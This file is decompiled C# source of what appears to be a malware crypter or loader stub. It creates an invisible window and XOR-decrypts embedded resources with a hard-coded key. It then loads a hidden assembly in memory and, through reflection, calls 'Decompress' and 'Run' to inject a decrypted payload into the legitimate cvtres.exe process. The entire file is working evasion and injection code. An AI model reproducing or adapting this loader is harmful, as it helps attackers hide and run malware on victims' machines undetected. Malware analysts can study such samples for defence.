using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class Fuck
{
	public class frmMain : Form
	{
		private void InitializeComponent()
		{
			((Control)this).SuspendLayout();
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(0f, 0f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(0, 0));
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Form)this).set_ShowInTaskbar(false);
			((Control)this).ResumeLayout(false);
			((Control)this).set_Visible(false);
			((Form)this).set_WindowState((FormWindowState)1);
		}

		public frmMain()
		{
			InitializeComponent();
			Utils.Swagger("Run", "cvtres.exe", Utils.Dew("Lcac.resources"), Utils.Dew("Wtu.resources"), false, 0);
		}
	}

	internal class Utils
	{
		public static object Swagger(string name, params object[] values)
		{
			SweetShadow sweetShadow = new SweetShadow();
			bool uwot = false;
			object retvalue = null;
			sweetShadow.ValueReturn += delegate(object value)
			{
				uwot = true;
				retvalue = value;
			};
			sweetShadow.QuietPlace(name, values);
			while (!uwot)
			{
				Thread.Sleep(0);
			}
			return retvalue;
		}

		public static byte[] getRes(string name)
		{
			ResourceManager resourceManager = new ResourceManager(name.Replace(".resources", ""), typeof(Fuck).Assembly);
			return XOR((byte[])resourceManager.GetObject("sgw"));
		}

		public static byte[] Dew(string name)
		{
			return (byte[])Swagger("Decompress", getRes(name));
		}

		public static byte[] XOR(byte[] data)
		{
			byte[] bytes = Encoding.GetEncoding(1252).GetBytes("03g;%=>hx8B}hL$`q~*#?NJ3GLLA>Jz,`eAfmeU('^2*G@mwk!-oDH7M.@kv4zQZg-!fiMN~U`y^8N<.3J3)Lsf9X}WE}xGFTB/Kwd(Is`JFAU3roT(.^Uqr{WIvbvfv");
			for (int i = 0; i < data.Length; i++)
			{
				data[i] = (byte)(bytes[i % bytes.Length] ^ data[i]);
			}
			return data;
		}
	}

	internal class SweetShadow
	{
		public delegate void ValueReturnEventHandler(object value);

		private Assembly _assembly;

		public event ValueReturnEventHandler ValueReturn;

		private void OnValueReturn(object value)
		{
			if (this.ValueReturn != null)
			{
				this.ValueReturn(value);
			}
		}

		public SweetShadow()
		{
			_assembly = AppDomain.CurrentDomain.Load(Utils.getRes("Vbryf.resources"));
		}

		public void QuietPlace(string name, object[] values)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Type[] types = _assembly.GetTypes();
				foreach (Type type in types)
				{
					MethodInfo[] methods = type.GetMethods();
					foreach (MethodInfo methodInfo in methods)
					{
						if (methodInfo.Name == name)
						{
							OnValueReturn(methodInfo.Invoke(null, values));
							break;
						}
					}
				}
			});
			thread.IsBackground = false;
			thread.Start();
		}
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		((Control)new frmMain()).Show();
	}
}
